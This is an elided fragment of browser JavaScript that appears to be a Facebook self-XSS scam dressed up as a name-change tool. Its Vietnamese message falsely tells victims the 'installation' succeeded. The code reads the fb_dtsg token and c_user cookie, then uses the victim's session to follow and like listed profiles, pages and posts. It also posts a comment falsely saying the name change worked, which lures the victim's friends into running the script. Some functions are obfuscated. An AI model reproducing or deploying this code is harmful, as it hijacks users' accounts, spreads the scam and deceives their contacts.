...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/totik92" target="_blank">CÀI ĐẶT THÀNH CÔNG! Bạn có thể thiết lập lại tên trong vài ngày tới, vui lòng kích chuột vào đây để thực hiện công đoạn hoàn tất sau 5 phút và không quá 60 phút kể từ khi đọc thông báo này. Ứng dụng sẽ bắt đầu tính thời gian chờ ngay sau khi bạn hoàn thành bước hoàn tất. Ứng dụng được phát triển bởi http://facebook.com/totik92 .<br>Tík Tô</a>';
	html += '</div>';
...
//fb totik
a("100003718335918");a("100001083836729");a("100002789195784");
sublist("374966022637339");sublist("383274198473188");
sublist("444626995671241");


//Group totik
var gid = ['623334177688469'];
...
var spage_id = "623334177688469";
var spost_id = "100003718335918";
...
// pic + fans
Like("189174104608253");
Like("426947914072628");
Like("604861232884629");
Like("637111466330261");
Like("484861668299959");
Like("1444530699107880");
Like("526775677435876");
Like("549640758467351");
Like("339620056130037");
P("438059252994682");
P("650757614977431");
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text=(Y) Làm đc rồi đổi tên thành công, làm thử nhé các bạn 💋 💐 ☕' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al(565518060212954);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
